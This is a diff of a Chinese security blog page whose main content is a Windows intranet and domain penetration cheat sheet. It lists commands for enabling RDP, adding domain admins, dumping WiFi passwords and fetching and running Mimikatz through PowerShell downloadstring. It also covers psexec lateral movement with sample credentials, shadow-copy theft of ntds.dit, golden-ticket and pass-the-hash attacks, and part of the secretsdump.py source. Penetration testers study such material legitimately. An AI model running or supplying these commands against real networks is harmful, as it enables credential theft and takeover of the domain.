+            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
+            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
         </a>
         
         <a  class=""
@@ -799,11 +958,19 @@
         </a>
         
         <a  class=""
-           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
-           data-tag="提权,linux"
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
+           data-tag="windows,提权"
            data-author="" >
-            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
-            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
+            <span class="post-title" title="提权之Windows">提权之Windows</span>
+            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
+           data-tag="提权"
+           data-author="" >
+            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
+            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
         </a>
         
         <a  class=""
@@ -823,14 +990,6 @@
         </a>
         
         <a  class=""
-           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
-           data-tag="提权"
-           data-author="" >
-            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
-            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
-        </a>
-        
-        <a  class=""
            href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
            data-tag="windows,提权,DLL"
            data-author="" >
@@ -847,11 +1006,11 @@
         </a>
         
         <a  class=""
-           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
-           data-tag="知识"
+           href="/%E5%85%8D%E6%9D%80/"
+           data-tag="免杀,绕过"
            data-author="" >
-            <span class="post-title" title="正则表达式">正则表达式</span>
-            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
+            <span class="post-title" title="免杀">免杀</span>
+            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
         </a>
         
         <a  class=""
@@ -863,11 +1022,19 @@
         </a>
         
         <a  class=""
-           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"
-           data-tag="工具,内网渗透"
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
+           data-tag="linux,提权"
            data-author="" >
-            <span class="post-title" title="端口转发">端口转发</span>
-            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
+            <span class="post-title" title="提权之Linux">提权之Linux</span>
+            <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="正则表达式">正则表达式</span>
+            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
         </a>
         
         <a  class=""
@@ -892,6 +1059,22 @@
            data-author="" >
             <span class="post-title" title="脱壳一">脱壳一</span>
             <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
+           data-tag="漏洞,端口"
+           data-author="" >
+            <span class="post-title" title="漏洞记录">漏洞记录</span>
+            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
+           data-tag="工具,内网渗透,端口"
+           data-author="" >
+            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
+            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
         </a>
         
         <a  class=""
@@ -925,7 +1108,13 @@
         
         <span class="tag">
             
+            <a class="color3">工具</a>
+            
             <a class="color5">内网渗透</a>
+            
+            <a class="color3">windows</a>
+            
+            <a class="color4">域渗透</a>
             
         </span>
         
@@ -933,7 +1122,7 @@
     <div class="article-meta">
         
         创建时间:<time class="date" title=''>2020-02-20 13:44<br/>
-        更新时间: 2020-02-20 13:49:06
+        更新时间: 2020-07-10 00:08:05
         </time>
         
     </div>
@@ -956,7 +1145,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-未整理"><span class="toc-text">0x00 未整理</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-内网渗透"><span class="toc-text">0x00 内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-系统相关命令"><span class="toc-text">0x10 系统相关命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-网络相关命令"><span class="toc-text">0x11 网络相关命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-进程及服务"><span class="toc-text">0x12 进程及服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-用户相关命令"><span class="toc-text">0x13 用户相关命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-文件相关"><span class="toc-text">0x14 文件相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-域信息搜集命令一"><span class="toc-text">0x20 域信息搜集命令一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21-域信息搜集命令二"><span class="toc-text">0x21 域信息搜集命令二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22-域信息搜集命令三"><span class="toc-text">0x22 域信息搜集命令三</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）"><span class="toc-text">0x23 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x24-GPP-组策略选项"><span class="toc-text">0x24 GPP 组策略选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-域中获取账号后"><span class="toc-text">0x30 域中获取账号后</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-Getshell到域控"><span class="toc-text">0x40 Getshell到域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-内网信息搜集"><span class="toc-text">0x50 内网信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-票据传递攻击"><span class="toc-text">0x60 票据传递攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x61-hash传递"><span class="toc-text">0x61 hash传递</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFE-参考"><span class="toc-text">0xFE 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-代码"><span class="toc-text">0xFF 代码</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -972,13 +1161,656 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="0x00-未整理"><a href="#0x00-未整理" class="headerlink" title="0x00 未整理"></a>0x00 未整理</h2><p>开3389<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
-<p>读管理员密码<br>创建用户，添加到管理员权限</p>
-<p>建隧道</p>
-<p>CS</p>
+        <h2 id="0x00-内网渗透"><a href="#0x00-内网渗透" class="headerlink" title="0x00 内网渗透"></a>0x00 内网渗透</h2><ol>
+<li>顾名思义：在内部局域网做渗透。</li>
+</ol>
+<hr>
+<h2 id="0x10-系统相关命令"><a href="#0x10-系统相关命令" class="headerlink" title="0x10 系统相关命令"></a>0x10 系统相关命令</h2><ol>
+<li>systeminfo #系统信息</li>
+<li>set #环境变量</li>
+<li>netsh firewall show config #显示防火墙配置</li>
+<li>netsh firewall show state #显示防火墙状态</li>
+<li>ver #查看windows版本</li>
+<li>chdir #查看当前路径</li>
+<li>dir #列出当前目录及文件</li>
+</ol>
+<hr>
+<h2 id="0x11-网络相关命令"><a href="#0x11-网络相关命令" class="headerlink" title="0x11 网络相关命令"></a>0x11 网络相关命令</h2><ol>
+<li>ipconfig /all #显示网络详细信息</li>
+<li>ipconfig /displaydns #查看DNS缓存</li>
+<li>route print #路由信息，netstat -r同样效果</li>
+<li>arp -a #查看arp表</li>
+<li>netstat -ano #网络连接信息</li>
+<li>net share #查看已开启共享</li>
+<li><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code> #查看RDP端口状况</li>
+<li><ul>
+<li>回显：PortNumber    REG_DWORD    0xd3d</li>
+</ul>
+</li>
+<li><code>REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v [项的名称] /t REG_DWORD /d [项的值] /f</code> #add：新建，/v：项的名称，/d：项的值，/f：强制</li>
+<li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code> #开启3389</li>
+<li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x344D /f</code> #更改默认端口3389为13389</li>
+<li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x344D /f</code> #更改默认端口3389为13389</li>
+<li>一行命令扫描存活IP：<code>for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code></li>
+<li>一行命令扫描存活IP输出到文件：@for /l %i in (1,1,255) do @ping -n 1 -w 1 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i&gt;&gt;c:\ips_dead.txt) else (echo 192.168.0.%i &gt;&gt;c:\ips_alive.txt)</li>
+</ol>
+<hr>
+<h2 id="0x12-进程及服务"><a href="#0x12-进程及服务" class="headerlink" title="0x12 进程及服务"></a>0x12 进程及服务</h2><ol>
+<li>tasklist #查看进程列表及PID</li>
+<li>net start #查看当前运行的服务</li>
+<li>netstat -ano #网络连接信息</li>
+</ol>
+<hr>
+<h2 id="0x13-用户相关命令"><a href="#0x13-用户相关命令" class="headerlink" title="0x13 用户相关命令"></a>0x13 用户相关命令</h2><ol>
+<li>whoami #当前用户</li>
+<li>net user #列出本地所有用户</li>
+<li>net1 user #列出本地所有用户</li>
+<li>query user #查看远程主机在线用户</li>
+<li>quser #查看远程主机在线用户</li>
+<li>net localgroup administrators #查看本机管理员</li>
+<li>net1 localgroup administrators #查看本机管理员</li>
+</ol>
+<hr>
+<h2 id="0x14-文件相关"><a href="#0x14-文件相关" class="headerlink" title="0x14 文件相关"></a>0x14 文件相关</h2><ol>
+<li><code>type c:\windows\system32\drivers\etc\hosts</code> #查看hosts文件</li>
+</ol>
+<hr>
+<h2 id="0x20-域信息搜集命令一"><a href="#0x20-域信息搜集命令一" class="headerlink" title="0x20 域信息搜集命令一"></a>0x20 域信息搜集命令一</h2><ol>
+<li><strong>域：Windows网络中独立运行的单位。域之间相互访问则需要建立信任关系（Trust Relation）。</strong></li>
+<li>net config workstation #查看当前域</li>
+<li>net accounts #查看本地密码策略</li>
+<li>net accounts /domain #查看域密码策略</li>
+<li>net use #查看网络连接</li>
+<li><code>net user /domain #查看域用户</code></li>
+<li>net group /domain #查看域组</li>
+<li>net time /domain #查看域时间</li>
+<li>net time \computername/IP #查看目标的时间</li>
+<li>net view #显示域、计算机或由指定计算机共享资源的列表</li>
+<li>net view \ip #查看某IP共享</li>
+<li>net view /domain #查询域列表</li>
+<li>net view /domain:[domain_name] #显示域、计算机或由指定计算机共享资源的列表</li>
+<li>net localgroup administrators /domain #查看域管理员</li>
+<li>net group “domain computers” /domain #查看域成员列表（计算机名）</li>
+<li><code>net group &quot;domain admins&quot; /domain #查看域管理员用户组</code></li>
+<li><code>net group &quot;domain controllers&quot; /domain #查看域控主机</code></li>
+<li><code>ping 域控主机[无$] #获取域控IP</code></li>
+<li>net user [username] [password] /add /domain #添加普通域用户</li>
+<li>net group “domain admins” [username] /add /domain #提升到域管理员</li>
+<li>net localgroup administrators workgroup\user001 /add #本机添加域用户</li>
+<li><code>dsquery server #查找域主机</code></li>
+<li><code>ping 域控主机名 #获取域控IP</code></li>
+<li>ping dcserver</li>
+<li>nltest /domain_trusts #查看域信任</li>
+<li>net session #查看当前会话</li>
+</ol>
+<hr>
+<h2 id="0x21-域信息搜集命令二"><a href="#0x21-域信息搜集命令二" class="headerlink" title="0x21 域信息搜集命令二"></a>0x21 域信息搜集命令二</h2><ol>
+<li><code>setspn -T domain.com -Q */*</code> #windows自带的setspn工具</li>
+<li><code>cscript GetUserSPNs.vbs</code></li>
+<li><code>Rubeus.exe kerberoast</code></li>
+<li><strong>windows版：</strong></li>
+<li>nslookup -type=ns [domain] #域传送</li>
+<li>nslookup</li>
+<li>server dns.[domain]</li>
+<li>ls [domain]</li>
+<li><strong>Linux版：</strong></li>
+<li>dig @dns.[domain] axfr [domain]</li>
+</ol>
+<hr>
+<h2 id="0x22-域信息搜集命令三"><a href="#0x22-域信息搜集命令三" class="headerlink" title="0x22 域信息搜集命令三"></a>0x22 域信息搜集命令三</h2><ol>
+<li>driverquery #查看安装的驱动</li>
+<li><code>for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</code> #一行命令获取连接过的WiFi密码</li>
+</ol>
+<hr>
+<h2 id="0x23-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）"><a href="#0x23-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）" class="headerlink" title="0x23 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）"></a>0x23 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）</h2><ol>
+<li>wmic product list brief #列出所有安装程序与版本信息</li>
+<li>wmic service list brief #列出所有服务</li>
+<li>wmic process list brief #列出所有进程</li>
+<li>wmic startup list brief #列出开机启动项</li>
+<li>wmic useraccount list brief #列出用户</li>
+<li>wmic sysaccount list brief #列出系统账户</li>
+<li>wmic qfe get Caption,Description,HotFixID,InstalledOn #查看补丁连接，描述，编号，安装时间</li>
+<li>wmic os #查看操作系统类型</li>
+<li>wmic /node:IP /user:[username] /password:[password] </li>
+</ol>
+<hr>
+<h2 id="0x24-GPP-组策略选项"><a href="#0x24-GPP-组策略选项" class="headerlink" title="0x24 GPP 组策略选项"></a>0x24 GPP 组策略选项</h2><ol>
+<li>当分发组策略时，会在域的sysvol目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。</li>
+<li>xml中的密码是aes加密的，密钥：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a></li>
+<li>解密脚本：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></li>
+<li>域用户登录脚本存在目录也会存在敏感文件：\\domain\Netlogon</li>
+</ol>
+<hr>
+<h2 id="0x30-域中获取账号后"><a href="#0x30-域中获取账号后" class="headerlink" title="0x30 域中获取账号后"></a>0x30 域中获取账号后</h2><ol>
+<li><strong>工具：</strong></li>
+<li><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec" target="_blank" rel="noopener">psexec.exe/psexec64.exe</a>：windows工具，允许执行远程系统上安装的程序</li>
+<li>命令：<code>psexec.exe \\远程主机IP -u [username] -p [password] -h cmd /c &quot;[commands]&quot;</code></li>
+<li>例子：<code>PsExec64.exe \\192.168.100.6 -u administrator -p Admin123 cmd</code> #内网远程登录服务器</li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/1.png" alt></li>
+<li><code>psexec -s \\IP -u [username] -p [password] cmd</code> #返回system权限shell</li>
+<li><code>psexec -accepteula @ips.txt -u [username] -p [password] -c 1.bat</code> #批量登录</li>
+<li><code>tasklist /v | find [username]</code>  #查找关于某用户进程，存在说明某用户登录过</li>
+<li><code>net use \\IP\C$ /user:[username] [password]</code> #建立非空连接</li>
+<li><code>net use \\IP\IPC$ [password] /user:[username]</code> #建立非空连接</li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/2.png" alt></li>
+<li><code>net use \\IP\IPC$ &quot;&quot; /user:[username]</code>  #建立空连接</li>
+<li><code>dir \\IP\c$</code> #列目录</li>
+<li><code>net use z: \\IP\c$ /user:[username] [password]</code> #映射盘符C盘到本地Z盘</li>
+<li>nbtstat -A IP #windows命令查看远程主机的用户名列表</li>
+<li>nbtscan -vh IP #Linux命令查看远程主机的用户名列表</li>
+<li><code>net use \\IP\c$ /del</code> #删除共享链接</li>
+<li><code>net use * /del</code> #删除共享映射</li>
+<li><code>net time \\computername/IP</code> #查看目标的时间</li>
+<li><code>at \\[computername/ip] 23:59 %path%\file</code> #计划任务执行文件 </li>
+<li><code>at \\IP 17:06 &quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot;</code></li>
+<li><code>copy f:\\1.txt \\IP\c$</code> #复制文件到服务器C盘</li>
+<li><code>copy \\IP\c$\1.txt f:\\1.txt</code> #复制文件到本地</li>
+<li><strong>抓明文：</strong></li>
+<li><code>powershell iex(new-object net.webclient).downloadstring(&#39;url/Invoke-Mimikatz.ps1&#39;);invoke-mimikatz-dumpcerts</code></li>
+<li><strong>抓hash：</strong></li>
+<li><code>powershell iex(new-object net.webclient).downloadstring(&#39;url/Get-PassHashes.ps1&#39;);get-passhashes</code></li>
+</ol>
+<hr>
+<h2 id="0x40-Getshell到域控"><a href="#0x40-Getshell到域控" class="headerlink" title="0x40 Getshell到域控"></a>0x40 Getshell到域控</h2><ol>
+<li>vssadmin.exe：系统自带创建/删除windows驱动器的卷影副本的工具</li>
+<li>检查是否存在C盘的卷影副本可用：</li>
+<li>vssadmin.exe list shadows</li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/3.png" alt></li>
+<li>有时候命令无法回显，如webshell，可直接输出到txt文件，或使用psexec.exe执行命令输出到txt文件</li>
+<li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;vssadmin list shadows &gt; \\192.168.0.104\C$\1.txt&quot;</code></li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/4.png" alt></li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/5.png" alt></li>
+<li>没有！自建C盘的卷影副本，来窃取ntds.dit和system文件</li>
+<li>vssadmin create shadow /for=C: &gt; 1.txt</li>
+<li>使用psexec执行：</li>
+<li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;vssadmin create shadow /for=C: &gt; \\192.168.0.104\C$\1.txt&quot;</code></li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/6.png" alt></li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/7.png" alt></li>
+<li><strong>域用户hash提取（在域控上执行）：</strong></li>
+<li>ntdsutil——snapshot——activate instance ntds——create——mount {guid}——copy 盘符:\windows\NTDS\ntds.dit C:\ntds_save.dit</li>
+<li>删除装载点：unmount {guid}—delete {guid}–quit</li>
+<li>QuarksPwDump.exe –dump-hash-domain –ntds-file c:\ntds_save.dit #配合ntdsutil导出域用户hash</li>
+</ol>
+<pre><code>成功地创建了 &#39;C:\&#39; 的卷影副本
+    卷影副本 ID: {984c45fc-94c2-4de6-adcc-59d266ce5913}
+    卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></pre><ol>
+<li>ntds.dit和SYSTEM文件的位置：</li>
+<li>“shadow_copy_volume_name\Windows\NTDS\NTDS.dit”</li>
+<li>“shadow_copy_volume_name\Windows\System32\config\SYSTEM”</li>
+<li>即在：</li>
+<li>\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit</li>
+<li>\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</li>
+<li>把他们复制到指定webshell目录下：</li>
+<li>psexec64.exe \192.168.0.104 -u administrator -p 123456 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \192.168.0.104\C$&quot;</li>
+<li>psexec64.exe \192.168.0.104 -u administrator -p 123456 -h cmd /c “copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \192.168.0.104\C$&quot;</li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/8.png" alt></li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/9.png" alt></li>
+<li>然后通过webshell下载SYSTEM和ntds.dit到本地主机，使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">secretsdump.py</a>脚本从ntds.dit和SYSTEM文件中提取：domain/uid/rid/LM hash/NT hash</li>
+<li>python secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</li>
+<li>图略</li>
+</ol>
+<p><a href="https://www.freebuf.com/articles/web/195709.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195709.html</a></p>
+<hr>
+<h2 id="0x50-内网信息搜集"><a href="#0x50-内网信息搜集" class="headerlink" title="0x50 内网信息搜集"></a>0x50 内网信息搜集</h2><ol>
+<li><strong>单行命令扫描存活主机</strong></li>
+<li>windows版：</li>
+<li>for /l %p in (1,1,254) do @ping -l 1 -n 3 -w 40 192.168.0.%p &amp; if errorlevel 1 (echo 192.168.0.%p&gt;&gt;na.txt) else (echo 192.168.0.%p&gt;&gt;ok.txt)</li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/11.png" alt></li>
+<li>Linux版：</li>
+<li>for i in {1..254}; do ping -q -i 0.01 -c 3 192.168.0.$i &amp;&gt; /dev/null &amp;&amp; echo 192.168.0.$i is alive; done</li>
+<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/10.png" alt></li>
+</ol>
+<hr>
+<h2 id="0x60-票据传递攻击"><a href="#0x60-票据传递攻击" class="headerlink" title="0x60 票据传递攻击"></a>0x60 票据传递攻击</h2><ol>
+<li>域中每个用户的ticket都是有krbtgt的密码hash来计算生成的。拿到krbtgt的密码hash，就可以伪造ticket，进而使用ticket登录域控制器。</li>
+<li><strong>条件：</strong>域管理账号、域名称、SID值</li>
+<li><code>net group &quot;domain admins&quot; /domain</code> #查询域管理用户</li>
+<li><code>net user /domain</code> #可查看到域名</li>
+<li><code>mimikatz.exe log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code> #cmd执行一条命令获取所有用户hash及SID值</li>
+<li><code>mimikatz # kerberos::golden /user:[域用户名] /domain:[域] /sid：[SID值] /krbtgt:[hash] /ticket:test.kirbi</code> #生成黄金票据（golden ticket）</li>
+<li><code>mimikatz # kerberos::ptt test.kirbi</code> #导入票据</li>
+<li><code>C:\.....&gt;klist</code> #域成员主机上执行klist，查看缓存的票据</li>
+<li><code>C:\.....&gt;dir \\域控\C$</code> #使用票据传递攻击，登录域控</li>
+</ol>
+<hr>
+<h2 id="0x61-hash传递"><a href="#0x61-hash传递" class="headerlink" title="0x61 hash传递"></a>0x61 hash传递</h2><ol>
+<li>有时候使用工具只能获取到账号的NTML hash，获取不到明文。</li>
+<li>domain已设置为.</li>
+<li>mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords”</li>
+<li><strong>工具：wce.exe</strong></li>
+<li>net use \IP\c$ #一般提示失败，提示需要用户登录认证</li>
+<li>wce.exe -s [username]:.:[LM值]:[NTLM值] #hash传递，. 是域名</li>
+<li>net use \IP\c$ #一般会成功，但会被发现</li>
+<li><strong>工具：mimikatz</strong></li>
+<li><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[NTLM值]&quot;</code></li>
+<li>net use \IP\c$ #一般会成功</li>
+</ol>
+<hr>
+<h2 id="0xFE-参考"><a href="#0xFE-参考" class="headerlink" title="0xFE 参考"></a>0xFE 参考</h2><p><a href="https://www.freebuf.com/articles/web/195709.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195709.html</a></p>
+<h2 id="0xFF-代码"><a href="#0xFF-代码" class="headerlink" title="0xFF 代码"></a>0xFF 代码</h2><p><strong><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py" target="_blank" rel="noopener">secretsdump.py</a></strong></p>
+<pre><code>#!/usr/bin/env python
+# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+#
+# This software is provided under a slightly modified version
+# of the Apache Software License. See the accompanying LICENSE file
+# for more information.
+#
+# Description: Performs various techniques to dump hashes from the
+#              remote machine without executing any agent there.
+#              For SAM and LSA Secrets (including cached creds)
+#              we try to read as much as we can from the registry
+#              and then we save the hives in the target system
+#              (%SYSTEMROOT%\\Temp dir) and read the rest of the
+#              data from there.
+#              For NTDS.dit we either:
+#                a. Get the domain users list and get its hashes
+#                   and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
+#                   call, replicating just the attributes we need.
+#                b. Extract NTDS.dit via vssadmin executed  with the
+#                   smbexec approach.
+#                   It&#39;s copied on the temp dir and parsed remotely.
+#
+#              The script initiates the services required for its working
+#              if they are not available (e.g. Remote Registry, even if it is 
+#              disabled). After the work is done, things are restored to the 
+#              original state.
+#
+# Author:
+#  Alberto Solino (@agsolino)
+#
+# References: Most of the work done by these guys. I just put all
+#             the pieces together, plus some extra magic.
+#
+# https://github.com/gentilkiwi/kekeo/tree/master/dcsync
+# https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
+# https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
+# https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
+# https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
+# https://code.google.com/p/creddump/
+# https://lab.mediaservice.net/code/cachedump.rb
+# https://insecurety.net/?p=768
+# http://www.beginningtoseethelight.org/ntsecurity/index.htm
+# https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&amp;-forensic-analysis.pdf
+# https://www.passcape.com/index.php?section=blog&amp;cmd=details&amp;id=15
+#
+from __future__ import division
+from __future__ import print_function
+import argparse
+import codecs
+import logging
+import os
+import sys
 
+from impacket import version
+from impacket.examples import logger
+from impacket.smbconnection import SMBConnection
+
+from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
+from impacket.krb5.keytab import Keytab
+try:
+    input = raw_input
+except NameError:
+    pass
+
+class DumpSecrets:
+    def __init__(self, remoteName, username=&#39;&#39;, password=&#39;&#39;, domain=&#39;&#39;, options=None):
+        self.__useVSSMethod = options.use_vss
+        self.__remoteName = remoteName
+        self.__remoteHost = options.target_ip
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = &#39;&#39;
+        self.__nthash = &#39;&#39;
+        self.__aesKey = options.aesKey
+        self.__smbConnection = None
+        self.__remoteOps = None
+        self.__SAMHashes = None
+        self.__NTDSHashes = None
+        self.__LSASecrets = None
+        self.__systemHive = options.system
+        self.__bootkey = options.bootkey
+        self.__securityHive = options.security
+        self.__samHive = options.sam
+        self.__ntdsFile = options.ntds
+        self.__history = options.history
+        self.__noLMHash = True
+        self.__isRemote = True
+        self.__outputFileName = options.outputfile
+        self.__doKerberos = options.k
+        self.__justDC = options.just_dc
+        self.__justDCNTLM = options.just_dc_ntlm
+        self.__justUser = options.just_dc_user
+        self.__pwdLastSet = options.pwd_last_set
+        self.__printUserStatus= options.user_status
+        self.__resumeFileName = options.resumefile
+        self.__canProcessSAMLSA = True
+        self.__kdcHost = options.dc_ip
+        self.__options = options
+
+        if options.hashes is not None:
+            self.__lmhash, self.__nthash = options.hashes.split(&#39;:&#39;)
+
+    def connect(self):
+        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
+        if self.__doKerberos:
+            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
+                                               self.__nthash, self.__aesKey, self.__kdcHost)
+        else:
+            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+    def dump(self):
+        try:
+            if self.__remoteName.upper() == &#39;LOCAL&#39; and self.__username == &#39;&#39;:
+                self.__isRemote = False
+                self.__useVSSMethod = True
+                if self.__systemHive:
+                    localOperations = LocalOperations(self.__systemHive)
